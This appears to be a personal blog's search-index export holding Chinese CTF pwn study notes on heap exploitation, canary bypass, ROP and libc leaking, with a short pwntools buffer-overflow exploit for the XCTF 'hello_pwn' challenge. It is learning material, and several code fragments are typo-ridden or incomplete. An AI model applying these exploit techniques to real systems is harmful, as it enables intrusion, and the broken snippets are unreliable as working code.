class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">Overflow <span class="keyword">directly </span> :</span><br><span class="line"></span><br><span class="line">​溢出相邻堆块内存的内容 例题: XMAN2016 fengshui(zijinghua pwn)</span><br><span class="line">SSC 安全大会 heapcanary </span><br><span class="line"></span><br><span class="line">作业:   heapcananry</span><br><span class="line"></span><br><span class="line">Fast <span class="keyword">bin </span>(维护单向链表)attack:</span><br><span class="line"></span><br><span class="line">​作业 : alictf <span class="number">2016</span> </span><br><span class="line"></span><br><span class="line">Unsorted <span class="keyword">bin </span>(双向链表)attack  </span><br><span class="line"></span><br><span class="line">Overwrite Topchunk</span><br><span class="line"></span><br><span class="line"><span class="keyword">bctf </span><span class="number">2016</span>   <span class="keyword">bcloud</span></span><br><span class="line"><span class="keyword"></span></span><br><span class="line"><span class="keyword">Cassical </span>&amp; Modem Unlink Attack</span><br><span class="line"></span><br><span class="line">​当free调用时, 如果与mem相邻的块时空闲的, 则会将其从空闲链表中拿(unlink) 下来并与mem合并..      </span><br><span class="line">​<span class="comment">#cefin unlink(P,BK,  GD)&#123;</span></span><br><span class="line"></span><br><span class="line">​<span class="keyword">BK </span>= P -&gt; <span class="keyword">bk;</span></span><br><span class="line"><span class="keyword"></span></span><br><span class="line"><span class="keyword">​</span>FD = P- &gt; fd;</span><br><span class="line"></span><br><span class="line">​FD -&gt; <span class="keyword">bk </span>= <span class="keyword">BK; </span>   </span><br><span class="line"></span><br><span class="line">​<span class="keyword">BK </span> -&gt; fd = FD;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">作业 :  Hitcon <span class="number">2014</span> qualifier stkof (Modern Unlink Attack) PlaidCTF <span class="number">2014</span></span><br><span class="line"></span><br><span class="line">Off <span class="keyword">bu </span>one &amp; Off <span class="keyword">by </span>null </span><br><span class="line"></span><br><span class="line">Other techniques</span><br><span class="line"></span><br><span class="line"><span class="comment">##### General exploit techiques</span></span><br><span class="line"></span><br><span class="line">heap fengshui </span><br><span class="line"></span><br><span class="line">heap spray </span><br><span class="line"></span><br><span class="line">Exploit mmap chunk   \</span><br><span class="line"></span><br><span class="line"><span class="comment">##### use after gfreee / double free</span></span><br></pre></td></tr></table></figure><h2 id="chanry-绕过"><a href="#chanry-绕过" class="headerlink" title="chanry 绕过"></a>chanry 绕过</h2><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">习题<span class="selector-tag">shitsco</span></span><br><span class="line">攻击手段与技术分析</span><br><span class="line">三道题花式绕过<span class="selector-tag">Canary</span></span><br><span class="line">攻防世界<span class="selector-pseudo">:babystack</span>:</span><br></pre></td></tr></table></figure><h3 id="涉及工具使用"><a href="#涉及工具使用" class="headerlink" title="涉及工具使用"></a>涉及工具使用</h3><pre><code>one_gdaget ./filenameretn 相当于 pop r    python2写payload 需要加上: # -*- coding: UTF-8 -*-  使文件成为utf-8格式                          python2默认采用ascii编码gdb-peda:pattern create 150  可以创造150个字符</code></pre><h2 id="rop利用链"><a href="#rop利用链" class="headerlink" title="rop利用链"></a><a href="https://xz.aliyun.com/t/3402" target="_blank" rel="noopener">rop利用链</a></h2><figure class="highlight ocaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">  rop的实现原理</span><br><span class="line"> 利用程序本身所有的指令实现绕过<span class="type">NX</span>保护,执行自己想要的system(<span class="string">"/bin/bash"</span>)</span><br><span class="line"> 也可从程序当中找到可利用的子函数,从 libc 中使用函数，需要知道 libc 的基地址。</span><br><span class="line"> 通常得到 libc 基地址思路就是：</span><br><span class="line">libc 函数的真实地址 =&gt; 由于给了 libc.so 文件知道相对偏移地址 =&gt; libc 基地址</span><br><span class="line"> =&gt; 其他任何 libc 函数真实地址   (基地址+偏移地址 = 真实地址)</span><br><span class="line"> <span class="type">A</span>真实地址-<span class="type">A</span>的偏移地址 = <span class="type">B</span>真实地址 - <span class="type">B</span>偏移地址 = 基地址</span><br><span class="line"></span><br><span class="line"> 获得<span class="type">B</span>得地址:</span><br><span class="line">  基于libc延迟绑定机制,我们需要选择已经执行过的函数来泄露 ,需要选择函数的plt地址,</span><br><span class="line">  找到jmp指向的哪个地址才是我们需要泄露的  </span><br><span class="line"> &lt;-- 例:</span><br><span class="line"> 比如通过puts函数泄露</span><br><span class="line"> elf = <span class="type">ELF</span>(<span class="string">"libc文件"</span>)</span><br><span class="line"> puts_plt = elf.pl[<span class="symbol">'puts</span>]</span><br><span class="line"> main_plt = elf.symbols[<span class="symbol">'_start'</span>]</span><br><span class="line"> puts_got = elf.got[<span class="symbol">'puts'</span>]</span><br><span class="line"> --&gt;      <span class="type">DynELFleak</span>技术   也即漏出技术  从漏出地址最后<span class="number">12</span>位</span><br></pre></td></tr></table></figure><p><a href="https://blog.csdn.net/qq_18661257/article/details/54694748" target="_blank" rel="noopener">参考GOT表与PLT表知识详解</a></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"> 三个重要问题:</span><br><span class="line">怎么去搜索这样的 gadget_addr，当然不止一次 pop，还可以多个 pop 加 ret 组合等等，</span><br><span class="line">看你希望怎么去利用</span><br><span class="line">如何得到 <span class="string">'/bin/sh\0'</span> 这样的字符串，通常程序没有这样的字符串</span><br><span class="line">如何得到 libc 中<span class="built_in"> system </span>实际运行的地址（libc 的基地址+system 在 libc 中的偏移地址）</span><br><span class="line"></span><br><span class="line">其实还有一个问题很重要，就是确定你的返回地址 return_addr 前面缓冲区到底有多大，</span><br><span class="line">这样才能准确的实现缓冲区溢出覆盖。做法有二种：一是直接从 IDA 的 F5 源码和汇编计算得到；</span><br><span class="line">二是使用 GDB 动态调试一下</span><br></pre></td></tr></table></figure><h2 id="pwntools"><a href="#pwntools" class="headerlink" title="pwntools"></a>pwntools</h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">asm</span><span class="params">(shellcraft.sh()</span></span>)  /bin/bash 汇编代码</span><br><span class="line">   设置架构格式</span><br><span class="line">pwntools   asm(shellcraft.sh)取得在设置架构下的/bin/bash 汇编代码</span><br></pre></td></tr></table></figure><p>from pwn import  *</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">DynELF时<span class="number">1</span>pwntools中专门用来应对无libc情况的漏洞利用模块</span><br><span class="line">其中也可通过函数泄露所执行文件中函数地址，通过函数后<span class="number">12</span>位找到libc文件版本，然后通过偏移找到sh(system ‘ bin/bash)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">asm(shellcraft.sh())  /bin/bash 汇编代码</span><br><span class="line">设置架构格式</span><br><span class="line">pwntools   asm(shellcraft.sh)取得在设置架构下的/bin/bash 汇编代码</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment">#DyELF模块</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(address)</span>:</span></span><br><span class="line">payload</span><br><span class="line"></span><br><span class="line">对DynELF(leak,elf=ELF(<span class="string">'./file'</span>)  </span><br><span class="line">无</span><br></pre></td></tr></table></figure><h2 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h2><h3 id="漏洞程序编写"><a href="#漏洞程序编写" class="headerlink" title="漏洞程序编写:"></a>漏洞程序编写:</h3><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">写出code后使用工具提取shellcode机器码,在漏洞区域实现shellcode覆盖</span><br><span class="line">通过ue实现汇编代码转换为<span class="number">16</span>进制    the exe shellcode</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -m32 yourname.c -o debugfunc32</span><br></pre></td></tr></table></figure><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">##### 溢出位数不够: 覆盖ebp, Partial  Ovewrite</span><br><span class="line"></span><br><span class="line">使用C32asm获取动态链接库的API函数地址 , 工具属于吾爱破解工具包</span><br></pre></td></tr></table></figure><pre><code> 对栈内数据：遵从从右到左压栈原则  ， 从下到上执行代码call 语句下的语句地址通常被称为返回地址利用溢出覆盖返回地址执行shellcoderor  循环移位</code></pre><h3 id="shellcode代码实现"><a href="#shellcode代码实现" class="headerlink" title="shellcode代码实现"></a>shellcode代码实现</h3><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">leak泄露地址：</span><br><span class="line">puts 函数处理</span><br><span class="line">输出长度不可控</span><br><span class="line">在遇到 \n(<span class="number">0x0a</span>) 继续输出</span><br><span class="line">在遇到 \<span class="number">0</span>(<span class="number">0x00</span>) 结束输出</span><br><span class="line">并且会在输出的最后添加 \n(<span class="number">0x0a</span>)</span><br><span class="line">plt段内函数地址并不是调用后的函数地址</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">libc.symbols[’function<span class="string">'] libc 文件内函数偏移量</span></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>xctf_hello_pwn</title>
      <link href="pwn/hello_pwn/hello_pwn/"/>
      <url>pwn/hello_pwn/hello_pwn/</url>
      
        <content type="html"><![CDATA[<h1 id="xctf-new-pwn"><a href="#xctf-new-pwn" class="headerlink" title="xctf new pwn"></a>xctf new pwn</h1><h2 id="hello-pwn"><a href="#hello-pwn" class="headerlink" title="hello pwn"></a>hello pwn</h2><a id="more"></a><p>file </p><p><img src="/images/hello_pwn/image-20200311001353144.png" alt="image-20200311001353144"></p><p>IDa:</p><p><img src="/images/hello_pwn/image-20200311002100438.png" alt="image-20200311002100438"></p><p>offect_distance:</p><p><img src="/images/hello_pwn/image-20200311002116258.png" alt="image-20200311002116258"></p><p>0x4h </p><p>so ,payload</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">payload</span> = <span class="string">'a'</span>*<span class="number">4</span> + p64(<span class="number">1853186401</span>)</span><br></pre></td></tr></table></figure><p>exp</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#coding=utf<span class="number">-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">'111.198.29.45'</span>,<span class="string">'59610'</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">4</span> + p64(<span class="number">1853186401</span>)</span><br><span class="line"></span><br><span class="line">#r.recvuntil(<span class="string">"lets get helloworld for bof"</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Weclome to pOne&#39;s  blog</title>
      <link href="Weclome-to-pOne-s-blog/"/>
      <url>Weclome-to-pOne-s-blog/</url>
      
        <content type="html"><![CDATA[<h1 id="Weclome-to-my-blog"><a href="#Weclome-to-my-blog" class="headerlink" title="Weclome to my blog"></a>Weclome to my blog</h1><p>this is my first blog’s index    </p><a id="more"></a><h2 id="something-about-web"><a href="#something-about-web" class="headerlink" title="something about web"></a>something about web</h2><p>​    there mang knowledge in my learing way, i hope i can still do my job. i knwo you can do</p><p> do  never <strong>give up</strong>, i believe, my boy !!!</p><h3 id="text-title"><a href="#text-title" class="headerlink" title="text title"></a>text title</h3><p><a href="/pwn/index">pwn</a></p><!--this page will be changed from time to time-->  ]]></content>
      
      
      
        <tags>
            
            <tag> index </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
